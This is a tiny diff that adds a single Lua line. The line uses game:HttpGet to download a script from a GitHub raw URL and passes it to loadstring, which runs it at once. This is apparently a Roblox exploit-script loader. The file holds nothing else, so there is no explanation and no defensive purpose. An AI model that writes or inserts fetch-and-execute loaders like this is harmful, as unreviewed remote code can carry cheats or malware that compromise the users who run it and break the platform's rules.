@@ -1,1 +1,1 @@
-x
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SecretBaby1921/Script/main/Coems",true))()
